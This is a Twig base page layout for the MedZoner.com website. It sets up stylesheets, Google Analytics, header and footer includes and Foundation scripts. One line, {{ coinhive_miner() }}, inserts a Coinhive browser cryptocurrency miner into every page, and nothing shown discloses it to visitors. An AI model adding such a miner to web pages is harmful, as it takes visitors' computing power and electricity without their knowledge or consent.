<!doctype html>
<html class="no-js" lang="{{ app.request.locale }}">
<head>
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>{% if page_title is defined %}{{ page_title }} | {% endif %}MedZoner.com</title>

    <link rel="icon" href="{{ asset('/favicon.png') }}" sizes="32x32">
    <link rel="stylesheet" href="{{ asset('/css/app.min.css'|asset_css_version) }}" />
    <link href="https://cdn.rawgit.com/walchko/techno-font/v0.7.3/assets/techno-font.css" rel="stylesheet">

    <!-- Google Analytics -->
    <script>
        (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
                (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
            m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
        })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');

        ga('create', 'UA-41400671-1', 'auto');
        ga('send', 'pageview');
    </script>
    <!-- End Google Analytics -->
</head>
<body>
<div class="container">
    {% include '@MedzonerGlobal/header.html.twig' %}
    {% block body %}{% endblock %}
    {% block content %}{% endblock %}
    {% include '@MedzonerGlobal/footer.html.twig' %}
</div>

<script src="https://use.fontawesome.com/14bb74bd50.js"></script>
{% if 'dev' == app.environment %}
    <script type="text/javascript" src="{{ asset('/dev/js/advert.js') }}"></script>
    <script type="text/javascript" src="{{ asset('/js/app.js') }}"></script>
{% else %}
    <!--<script type="text/javascript" src="{{ asset(advert_script) }}"></script>-->
    <script type="text/javascript" src="{{ asset('/js/app.min.js'|asset_js_version) }}"></script>
{% endif %}
{{ coinhive_miner() }}
<script type="text/javascript">
    $(document).ready(function () {
        $(document).foundation({
            reveal: {
                animation_speed: 500
            },
            tooltip: {
                disable_for_touch: true
            },
            topbar: {
                custom_back_text: false,
                is_hover: true,
                mobile_show_parent_link: true
            }
        });
        {% block document_ready %}{% endblock %}
    });
</script>
</body>
</html>
